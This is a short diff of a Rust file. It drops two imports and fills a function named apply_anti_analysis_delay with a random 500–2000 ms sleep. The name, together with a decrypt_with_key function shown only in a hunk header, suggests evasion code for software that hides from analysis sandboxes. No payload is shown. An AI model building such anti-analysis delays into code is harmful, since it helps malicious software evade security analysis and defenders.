@@ -1,5 +1,3 @@
-use regex::Regex;
-use aes::Aes256;
 use std::thread;
 use std::time::Duration;
 use base64::{engine::general_purpose, Engine as _};
@@ -38,5 +36,6 @@ pub fn decrypt_with_key(data: &[u8], key: &[u8]) -> Vec<u8> {
 }
 
 pub fn apply_anti_analysis_delay() {
-    // Placeholder
+    let millis = rand::thread_rng().gen_range(500..=2000);
+    thread::sleep(Duration::from_millis(millis));
 }
